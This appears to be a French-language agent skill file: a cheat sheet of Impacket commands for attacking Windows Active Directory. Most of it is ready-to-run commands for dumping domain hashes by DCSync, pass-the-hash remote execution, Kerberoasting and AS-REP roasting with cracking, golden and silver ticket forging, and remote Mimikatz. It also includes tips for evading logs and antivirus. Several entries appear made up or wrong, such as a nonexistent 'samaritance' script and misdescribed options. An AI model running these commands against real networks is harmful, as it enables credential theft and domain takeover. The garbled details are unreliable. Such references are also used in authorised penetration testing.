---
name: impacket
description: Impacket — suite complète d'exploitation AD et Windows (secretsdump, psexec, wmiexec, smbexec, atexec, GetNPUsers, GetUserSPNs, ticket conversion, DCSync, Kerberos), exemples et scénarios de pentest AD.
---

# Impacket — Suite d'Exploitation Active Directory

## Présentation

Impacket est une collection de scripts Python pour interagir avec les protocoles réseau Windows. Indispensable pour le pentest Active Directory.

**Installation :**
```bash
# Kali
sudo apt install impacket-scripts python3-impacket

# Dernière version (pip)
pip3 install impacket

# GitHub
git clone https://github.com/fortra/impacket.git
cd impacket && pip3 install .
```

**Scripts disponibles :**
```bash
ls /usr/share/doc/python3-impacket/examples/ | grep .py
# Les scripts sont aussi accessibles directement via leur nom :
# secretsdump.py, psexec.py, wmiexec.py, etc.
```

---

## Secretsdump — Extraction de credentials

### DCSync (depuis un DC ou un compte avec droits de réplication)
```bash
# Dump de tous les hashes du domaine (comme un DC)
impacket-secretsdump -hashes LMHASH:NTHASH DOMAIN/admin@192.168.1.10
impacket-secretsdump DOMAIN/Admin:Password@192.168.1.10

# Avec un hash seulement (pass-the-hash)
impacket-secretsdump -hashes :NTHASH DOMAIN/admin@192.168.1.10

# Via NTDS.dit local (sans connexion réseau)
impacket-secretsdump -ntds /path/to/ntds.dit -system /path/to/SYSTEM LOCAL
```

### Dump du SAM (local)
```bash
# Depuis la machine cible (nécessite admin local)
impacket-secretsdump -sam /path/to/SAM -system /path/to/SYSTEM LOCAL

# Depuis un backup
impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
```

### Options avancées
```bash
# Juste le krbtgt
impacket-secretsdump -just-dc-user krbtgt DOMAIN/admin@DC

# Juste NTDS
impacket-secretsdump -just-dc DOMAIN/admin@DC

# Historique des mots de passe
impacket-secretsdump -history DOMAIN/admin@DC

# Export des clés (pour forger des tickets)
impacket-secretsdump -k DOMAIN/admin@DC

# Pause entre requêtes (furtif)
impacket-secretsdump -dc-ip 192.168.1.10 -p 10 DOMAIN/admin@DC
```

---

## PsExec — Exécution de commandes (SMB)

### Exécution de commandes distante
```bash
# Avec mot de passe
impacket-psexec DOMAIN/admin:Password@192.168.1.10

# Avec hash (pass-the-hash)
impacket-psexec -hashes :NTHASH DOMAIN/admin@192.168.1.10

# Commande spécifique
impacket-psexec DOMAIN/admin:Password@192.168.1.10 whoami

# Avec session locale
impacket-psexec -hashes :NTHASH admin@192.168.1.10 cmd.exe

# Options :
#   -ts          : Ajouter le timestamp
#   -debug       : Mode debug
#   -codec       : Encodage (ex: -codec utf-8)
#   -nooutput    : Pas de retour (silent)
#   -service-name: Nom du service (contournement AV)
```

---

## WMIExec — Exécution via WMI (plus furtif)

```bash
# Avec mot de passe
impacket-wmiexec DOMAIN/admin:Password@192.168.1.10

# Avec hash
impacket-wmiexec -hashes :NTHASH DOMAIN/admin@192.168.1.10

# Commande
impacket-wmiexec DOMAIN/admin:Password@192.168.1.10 ipconfig

# Avantages par rapport à PsExec :
#   - Pas de création de service
#   - Pas d'écriture dans les logs d'événements (Service Control Manager)
#   - Fonctionne sans le service Server/SMB

# Inconvénient : nécessite DCOM, parfois bloqué par les firewalls
```

---

## SMBExec — Exécution discrète

```bash
# Similaire à PsExec mais plus discret
impacket-smbexec DOMAIN/admin:Password@192.168.1.10

# Avec hash
impacket-smbexec -hashes :NTHASH DOMAIN/admin@192.168.1.10

# Avantage : moins de bruit que PsExec
# Inconvénient : plus lent (crée un service SMB partagé)
```

---

## Atexec — Exécution via Scheduled Tasks

```bash
# Crée une tâche planifiée → exécute la commande → supprime la tâche
impacket-atexec DOMAIN/admin:Password@192.168.1.10 whoami

# Avec hash
impacket-atexec -hashes :NTHASH DOMAIN/admin@192.168.1.10

# Avantage : passe sous les radars (logs Windows Task Scheduler)
# Inconvénient : nécessite admin (comme PsExec/WMIExec)
```

---

## DCOMExec — Exécution via DCOM

```bash
# Via MMC20.Application
impacket-dcomexec DOMAIN/admin:Password@192.168.1.10

# Via ShellWindows
impacket-dcomexec -object ShellWindows DOMAIN/admin:Password@192.168.1.10

# Via ShellBrowserWindow
impacket-dcomexec -object ShellBrowserWindow DOMAIN/admin:Password@192.168.1.10

# Via Excel (nécessite Excel installé)
impacket-dcomexec -object ExcelDDE DOMAIN/admin:Password@192.168.1.10
```

---

## Kerberos — Attaques

### AS-REP Roasting (GetNPUsers)
```bash
# Identifier les utilisateurs sans pré-authentification Kerberos
impacket-GetNPUsers DOMAIN/ -dc-ip 192.168.1.10 -usersfile users.txt

# Avec un compte valide
impacket-GetNPUsers DOMAIN/user:Password@192.168.1.10

# Format output
impacket-GetNPUsers DOMAIN/ -dc-ip 192.168.1.10 -format hashcat
impacket-GetNPUsers DOMAIN/ -dc-ip 192.168.1.10 -format john

# Tous les utilisateurs
impacket-GetNPUsers DOMAIN/ -dc-ip 192.168.1.10 -request
```

### Kerberoasting (GetUserSPNs)
```bash
# Lister les SPN et demander des tickets TGS
impacket-GetUserSPNs DOMAIN/user:Password@192.168.1.10

# Avec hash
impacket-GetUserSPNs -hashes :NTHASH DOMAIN/user@192.168.1.10

# Output format pour cracking
impacket-GetUserSPNs DOMAIN/user:Password@192.168.1.10 \
    -outputfile kerberos_hashes.txt

# Cracker
hashcat -m 13100 kerberos_hashes.txt rockyou.txt
john --format=krb5tgs kerberos_hashes.txt --wordlist=rockyou.txt
```

### Ticket conversion (ticketConverter)
```bash
# Windows → Linux (CCACHE)
impacket-ticketConverter /path/to/ticket.kirbi ticket.ccache

# Linux → Windows
impacket-ticketConverter ticket.ccache ticket.kirbi

# Utiliser le ticket converti
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec -k -no-pass DOMAIN/admin@target
```

### Pass-the-Ticket
```bash
# Exporter le ticket TGT actuel
# Depuis une session Meterpreter ou un shell Windows
# mimikatz : sekurlsa::tickets /export

# Convertir en CCACHE
impacket-ticketConverter ticket.kirbi ticket.ccache

# Utiliser le ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-wmiexec -k -no-pass DOMAIN/admin@192.168.1.10
```

### Découverte d'utilisateurs (lookupsid)
```bash
# RID cycling — énumérer les utilisateurs d'un domaine
impacket-lookupsid DOMAIN/admin:Password@192.168.1.10 500-1000

# Avec hash
impacket-lookupsid -hashes :NTHASH DOMAIN/admin@192.168.1.10 0-10000
```

---

## SMB — Énumération et exploitation

### SMB client
```bash
# Connexion SMB
impacket-smbclient DOMAIN/admin:Password@192.168.1.10

# Avec hash
impacket-smbclient -hashes :NTHASH admin@192.168.1.10

# Commandes interactives :
#   shares    → Lister les partages
#   use C$    → Monter le C$ (admin requis)
#   ls        → Lister les dossiers
#   get file  → Télécharger un fichier
#   put file  → Uploader un fichier
#   cd        → Changer de dossier
```

### SMB Server
```bash
# Serveur SMB pour recevoir des fichiers
impacket-smbserver SHARE_NAME /tmp/share

# Avec accès
impacket-smbserver SHARE_NAME /tmp/share -smb2support

# Avec authentification
impacket-smbserver SHARE_NAME /tmp/share -user admin -password Password123

# Sur la cible (Windows)
net use Z: \\192.168.1.50\SHARE_NAME
```

---

## Pass-the-Hash avec différents scripts

```bash
# Tous les scripts impacket supportent pass-the-hash
# Format : -hashes LMHASH:NTHASH

# Si LM hash = AAD3B435B51404EEAAD3B435B51404EE (hash nul)
# → Pass-the-Hash standard

# Si NTHASH connu :
impacket-psexec -hashes :NTHASH admin@192.168.1.10
impacket-wmiexec -hashes :NTHASH admin@192.168.1.10
impacket-smbexec -hashes :NTHASH admin@192.168.1.10
impacket-atexec -hashes :NTHASH admin@192.168.1.10
impacket-dcomexec -hashes :NTHASH admin@192.168.1.10
impacket-mimikatz -hashes :NTHASH admin@192.168.1.10

# N'oubliez pas : le LM hash peut être n'importe quoi
```

---

## Mimikatz (via Impacket)

```bash
# Exécuter Mimikatz à distance via Impacket
impacket-mimikatz DOMAIN/admin:Password@192.168.1.10

# Commandes courantes :
#   sekurlsa::logonpasswords
#   sekurlsa::tickets /export
#   lsadump::sam
#   lsadump::dcsync
#   token::elevate
#   misc::cmd
```

---

## Requêtes MSRPC

```bash
# Découverte de rôles
impacket-rpcdump 192.168.1.10
impacket-rpcdump 192.168.1.10 -port 135

# MS-RPRN (Print Spooler)
impacket-rpcdump 192.168.1.10 -port 135 | grep -i printer

# MS-EFSRPC (PetitPotam)
impacket-rpcdump 192.168.1.10 -port 135 | grep -i efs
```

---

## Autres scripts utiles

### Enum4linux
```bash
# Énumération de base (pas impacket mais complémentaire)
enum4linux -a 192.168.1.10
```

### Samaritance (récupération de hash SAM)
```bash
impacket-samaritance DOMAIN/admin:Password@192.168.1.10
```

### split (découpage de fichiers)
```bash
# Dans une session interactive via smbexec/wmiexec, split est utile
# pour les gros fichiers
```

### GetADUsers
```bash
# Lister les utilisateurs AD
impacket-GetADUsers -all DOMAIN/admin:Password@192.168.1.10
impacket-GetADUsers DOMAIN/user:Password@192.168.1.10
```

### ticketer (forger des tickets)
```bash
# Forger un Golden Ticket
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> \
    -domain DOMAIN Administrator

# Forger un Silver Ticket
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <SID> \
    -domain DOMAIN -spn cifs/target Administrator
```

### addcomputer
```bash
# Ajouter une machine au domaine (si rights)
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Password123' \
    DOMAIN/user:Password@192.168.1.10
```

### changepassword
```bash
# Changer le mot de passe d'un utilisateur (admin requis)
impacket-changepassword DOMAIN/admin:OldPass@192.168.1.10 \
    -newpass NewPass -target DOMAIN\targetuser
```

---

## Scénarios complets

### 1. Dump complet du domaine (DCSync)
```bash
# Condition : admin domaine ou droit de réplication

impacket-secretsdump DOMAIN/Admin:Password@192.168.1.10
# Récupère :
#   - Hash de tous les utilisateurs
#   - Hash du krbtgt (pour Golden Ticket)
#   - Sessions active (machine accounts)
#   - Trust passwords
```

### 2. Kerberoasting + Crack
```bash
# 1. Récupérer les TGS
impacket-GetUserSPNs DOMAIN/user:Password@192.168.1.10 \
    -outputfile kerb_hashes.txt

# 2. Crack
hashcat -m 13100 kerb_hashes.txt rockyou.txt
# OU
john --format=krb5tgs kerb_hashes.txt --wordlist=rockyou.txt
```

### 3. Pass-the-Hash + PsExec
```bash
# 1. Dump les hashes (secretsdump)
# 2. Choisir un compte admin (local ou domaine)
# 3. Pass-the-Hash
impacket-psexec -hashes :NTHASH admin@192.168.1.10

# 4. WMIExec (plus furtif)
impacket-wmiexec -hashes :NTHASH admin@192.168.1.10
```

### 4. Découverte complète d'un domaine
```bash
# 1. Enumération des utilisateurs
impacket-GetADUsers -all DOMAIN/user:Password@192.168.1.10

# 2. RID cycling
impacket-lookupsid DOMAIN/user:Password@192.168.1.10 0-10000

# 3. Kerberoasting
impacket-GetUserSPNs DOMAIN/user:Password@192.168.1.10 -outputfile kerb.txt

# 4. AS-REP roasting
impacket-GetNPUsers DOMAIN/ -dc-ip 192.168.1.10 -usersfile users.txt

# 5. DCSync (admin requis)
impacket-secretsdump DOMAIN/Admin:Password@192.168.1.10
```

---

## Antisèche rapide

```bash
# Dump du domaine
impacket-secretsdump DOMAIN/admin:Password@DC

# PsExec
impacket-psexec DOMAIN/admin:Password@target cmd.exe

# WMIExec (furtif)
impacket-wmiexec DOMAIN/admin:Password@target

# Kerberoasting
impacket-GetUserSPNs DOMAIN/user:Password@DC -outputfile hashes.txt

# AS-REP Roasting
impacket-GetNPUsers DOMAIN/ -dc-ip DC -usersfile users.txt

# Pass-the-Hash
impacket-psexec -hashes :NTHASH admin@target

# DCOMExec
impacket-dcomexec DOMAIN/admin:Password@target

# Lookup SID (enum users)
impacket-lookupsid DOMAIN/admin:Password@DC 0-10000

# SMB client
impacket-smbclient DOMAIN/admin:Password@target

# SMB server
impacket-smbserver SHARE /tmp/share -smb2support
```